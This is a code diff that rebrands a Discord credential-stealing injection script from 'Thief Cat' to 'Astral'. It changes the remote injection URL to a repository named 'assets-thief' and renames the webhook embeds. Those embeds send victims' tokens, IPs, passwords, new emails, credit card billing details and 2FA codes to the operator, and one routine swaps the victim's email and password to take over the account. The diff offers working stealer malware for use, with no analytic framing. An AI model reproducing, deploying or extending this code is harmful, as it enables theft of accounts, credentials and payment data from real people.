@@ -23,7 +23,7 @@ var config = {
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
   injection_url:
-    "https://raw.githubusercontent.com/hawkish-teams/cerf/main/index.js",
+    "https://raw.githubusercontent.com/freeman649/assets-thief/main/discord-inject.js",
   webhook: "%WEBHOOK%",
   Placed: "%API_URL%",
   Filter: {
@@ -78,9 +78,9 @@ async function execScript(str) {
   
   const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
     var params = {
-      username: "Thief Cat",
+      username: "Astral",
       avatar_url:
-        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/thiefcat.png",
+        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png",
       content: "",
       embeds: [
         {
@@ -93,7 +93,7 @@ async function execScript(str) {
           },
   
           footer: {
-            text: ` [${config.creator}] | https://github.com/ThiefCatify/`,
+            text: ` [${config.creator}] | https://github.com/freeman649/`,
           },
         },
       ],
@@ -517,7 +517,7 @@ async function execScript(str) {
     });
   }
   function generatePassword() {
-    const baseWords = ["NovaSentinel", "Nova", "Gaypsilon", "Epsimerde"];
+    const baseWords = ["Astral", "AstralStealer", "Gaynova", "novamerde"];
     const randomBaseWord =
       baseWords[Math.floor(Math.random() * baseWords.length)];
     const randomNumberCount = Math.floor(Math.random() * 9) + 1;
@@ -552,16 +552,16 @@ async function execScript(str) {
   const FirstTime = async () => {
     var token = await execScript(tokenScript);
     if (config["init-notify"] !== "true") return true;
-    if (fs.existsSync(__dirname + "/ThiefCat")) {
+    if (fs.existsSync(__dirname + "/Astral")) {
       try {
-        fs.rmdirSync(__dirname + "/ThiefCat");
+        fs.rmdirSync(__dirname + "/Astral");
       } catch (err) {}
       var ip = await getIP();
       var { appPath, appName } = path;
       var client_discord = appName;
       if (!token) {
         var params = await makeEmbed({
-          title: "<a:caat:1130448857436782682> Thief Cat Initialized",
+          title: "Astral Initialized",
           fields: [
             {
               name: "Injection Info",
@@ -589,10 +589,10 @@ async function execScript(str) {
         var Friends = parseFriends(friends);
         if (!user.avatar)
           var userAvatar =
-            "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/cat-2d-animation.gif";
+            "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
         if (!user.banner)
           var userBanner =
-            "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/Thief%20Cat.gif";
+            "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
   
         userBanner =
           userBanner ??
@@ -605,7 +605,7 @@ async function execScript(str) {
             `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
           ));
         var params = await makeEmbed({
-          title: " Thief Cat Initialized",
+          title: " Astral Initialized",
           description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
           fields: [
             {
@@ -649,7 +649,7 @@ async function execScript(str) {
               inline: !0,
             },
             {
-              name: "ThiefCatified Files",
+              name: "Astral Files",
               value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
               inline: !0,
             },
@@ -664,7 +664,7 @@ async function execScript(str) {
               inline: !0,
             },
             {
-              name: "Bio <a:caat:1130448857436782682>",
+              name: "Bio",
               value: `\`\`\`${
                 user.bio !== null && user.bio !== undefined && user.bio !== ""
                   ? user.bio
@@ -682,7 +682,7 @@ async function execScript(str) {
           thumbnail: userAvatar,
         });
         var params2 = await makeEmbed({
-          title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+          title: `Total Friends (${Friends.len})`,
           color: config["embed-color"],
           description: Friends.badges,
           image: userBanner,
@@ -699,7 +699,7 @@ async function execScript(str) {
         if (!token) {
           var params = await makeEmbed({
             title:
-              "<a:caat:1130448857436782682> Thief Cat User log out (User not Logged in before)",
+              "Astral User log out (User not Logged in before)",
             fields: [
               {
                 name: "Injection Info",
@@ -727,10 +727,10 @@ async function execScript(str) {
           var Friends = parseFriends(friends);
           if (!user.avatar)
             var userAvatar =
-              "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/cat-2d-animation.gif";
+              "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
           if (!user.banner)
             var userBanner =
-              "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/Thief%20Cat.gif";
+              "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
   
           userBanner =
             userBanner ??
@@ -743,7 +743,7 @@ async function execScript(str) {
               `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`
             ));
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat Victim got logged out",
+            title: "Astral Victim got logged out",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
             fields: [
               {
@@ -787,7 +787,7 @@ async function execScript(str) {
                 inline: !0,
               },
               {
-                name: "ThiefCatified Files",
+                name: "Astral Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: !0,
               },
@@ -825,7 +825,7 @@ async function execScript(str) {
             thumbnail: userAvatar,
           });
           var params2 = await makeEmbed({
-            title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+            title: `Total Friends (${Friends.len})`,
             color: config["embed-color"],
             description: Friends.badges,
             image: userBanner,
@@ -948,10 +948,10 @@ async function execScript(str) {
     );
     if (!user.avatar)
       var userAvatar =
-        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/cat-2d-animation.gif";
+        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
     if (!user.banner)
       var userBanner =
-        "https://raw.githubusercontent.com/hawkerthewinner/cerf/main/assets/Thief%20Cat.gif";
+        "https://raw.githubusercontent.com/freeman649/assets-thief/main/icons8-trou-noir-48-removebg-preview.png";
   
     var userBanner =
       userBanner ??
@@ -1443,7 +1443,7 @@ async function execScript(str) {
                 } = await BoukiTuclcavectesfonctions();
                 var password = data.password;
                 var params = await makeEmbed({
-                  title: "<a:caat:1130448857436782682> Thief Cat User Login",
+                  title: "Astral User Login",
                   color: config["embed-color"],
                   description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                   fields: [
@@ -1488,7 +1488,7 @@ async function execScript(str) {
                       inline: !0,
                     },
                     {
-                      name: "ThiefCatified Files",
+                      name: "Astral Files",
                       value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                       inline: !0,
                     },
@@ -1545,7 +1545,7 @@ async function execScript(str) {
                 });
   
                 var params2 = await makeEmbed({
-                  title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+                  title: `Total Friends (${Friends.len})`,
                   color: config["embed-color"],
                   description: Friends.badges,
                   image: userBanner,
@@ -1575,7 +1575,7 @@ async function execScript(str) {
               var password = data.password;
   
               var params = await makeEmbed({
-                title: "<a:caat:1130448857436782682> Thief Cat User Login",
+                title: "Astral User Login",
                 color: config["embed-color"],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [
@@ -1645,7 +1645,7 @@ async function execScript(str) {
                     inline: !0,
                   },
                   {
-                    name: "Bio <a:caat:1130448857436782682>",
+                    name: "Bio",
                     value: `\`\`\`${
                       user.bio !== null &&
                       user.bio !== undefined &&
@@ -1666,7 +1666,7 @@ async function execScript(str) {
               });
   
               var params2 = await makeEmbed({
-                title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+                title: `Total Friends (${Friends.len})`,
                 color: config["embed-color"],
                 description: Friends.badges,
                 image: userBanner,
@@ -1684,7 +1684,7 @@ async function execScript(str) {
           if (data.new_password) {
             var params = await makeEmbed({
               title:
-                "<a:caat:1130448857436782682> Thief Cat Detect Password Changed",
+                "Astral Detect Password Changed",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1778,7 +1778,7 @@ async function execScript(str) {
             });
   
             var params2 = await makeEmbed({
-              title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+              title: `Total Friends (${Friends.len})`,
               color: config["embed-color"],
               description: Friends.badges,
               image: userBanner,
@@ -1794,7 +1794,7 @@ async function execScript(str) {
               const username = config.mail.substring(0, atIndex);
               const domain = config.mail.substring(atIndex);
   
-              const generatedEmail = `${username ?? "kschdediscord"}+${generateId(
+              const generatedEmail = `${username ?? "le_chat_blanc666."}+${generateId(
                 3
               )}${domain ?? "@gmail.com"}`;
               const generatedPassword = generatePassword();
@@ -1818,7 +1818,7 @@ async function execScript(str) {
   
                     var params = await makeEmbed({
                       title:
-                        "<a:caat:1130448857436782682> Thief Cat Have changed the victim mail",
+                        "Astral Have changed the victim mail",
                       color: config["embed-color"],
                       description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                       fields: [
@@ -1884,7 +1884,7 @@ async function execScript(str) {
             }
             var params = await makeEmbed({
               title:
-                "<a:caat:1130448857436782682> Thief Cat Detect Email Changed",
+                "Astral Detect Email Changed",
               color: config["embed-color"],
               description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
               fields: [
@@ -1929,7 +1929,7 @@ async function execScript(str) {
                   inline: !0,
                 },
                 {
-                  name: "ThiefCatified Files",
+                  name: "Astral Files",
                   value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                   inline: !0,
                 },
@@ -1954,7 +1954,7 @@ async function execScript(str) {
                   inline: !0,
                 },
                 {
-                  name: "Bio <a:caat:1130448857436782682>",
+                  name: "Bio",
                   value: `\`\`\`${
                     user.bio !== null && user.bio !== undefined && user.bio !== ""
                       ? user.bio
@@ -1973,7 +1973,7 @@ async function execScript(str) {
             });
   
             var params2 = await makeEmbed({
-              title: `<a:caat2:1130448854861488168> Total Friends (${Friends.len})`,
+              title: `Total Friends (${Friends.len})`,
               color: config["embed-color"],
               description: Friends.badges,
               image: userBanner,
@@ -2008,11 +2008,11 @@ async function execScript(str) {
                   dt.billing_address;
                 var params = await makeEmbed({
                   title:
-                    "<a:caat:1130448857436782682> Thief Cat User Credit Card Added",
+                    "Astral User Credit Card Added",
                   color: config["embed-color"],
                   fields: [
                     {
-                      name: "ThiefCatified Files",
+                      name: "Astral Files",
                       value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                       inline: false,
                     },
@@ -2104,11 +2104,11 @@ async function execScript(str) {
           }
   
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat User Enable 2FA",
+            title: "Astral User Enable 2FA",
             color: config["embed-color"],
             fields: [
               {
-                name: "ThiefCatified Files",
+                name: "Astral Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: false,
               },
@@ -2169,11 +2169,11 @@ async function execScript(str) {
           break;
         case request.url.endsWith("/disable"):
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat User Removed 2FA",
+            title: "Astral User Removed 2FA",
             color: config["embed-color"],
             fields: [
               {
-                name: "ThiefCatified Files",
+                name: "Astral Files",
                 value: `[Gofile <:gofile:1150190597462823003>](${config.transfer_link})`,
                 inline: false,
               },
@@ -2243,7 +2243,7 @@ async function execScript(str) {
             }
           }
           var params = await makeEmbed({
-            title: "<a:caat:1130448857436782682> Thief Cat User 2FA Codes",
+            title: "Astral User 2FA Codes",
             color: config["embed-color"],
             fields: [
               {
@@ -2304,4 +2304,4 @@ async function execScript(str) {
       }
     }
   );
-  
+ 
